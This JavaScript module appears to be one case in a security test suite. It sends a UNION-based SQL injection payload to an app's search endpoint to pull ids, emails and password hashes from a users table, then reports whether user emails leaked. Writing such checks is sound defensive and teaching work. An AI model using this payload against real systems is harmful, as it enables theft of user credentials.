import { get } from '../lib/client.mjs'

export default {
  id: 'I1',
  title: 'The search box returns the users table',
  topic: 'Injection — user input concatenated into SQL',
  kind: 'http',

  async attack() {
    // Close the LIKE string, bolt on a UNION, comment out the rest.
    const payload = "%' UNION SELECT id, email, password_hash FROM users --"
    const res = await get(`/api/search?q=${encodeURIComponent(payload)}`)

    const rows = Array.isArray(res.json) ? res.json : []
    const leakedAnEmail = rows.some((row) =>
      Object.values(row).some((v) => typeof v === 'string' && v.includes('@example.com')),
    )

    return {
      worked: leakedAnEmail,
      evidence: leakedAnEmail
        ? `GET /api/search returned ${rows.length} rows containing user emails`
        : `GET /api/search returned ${res.status} with ${rows.length} rows and no user data`,
    }
  },
}
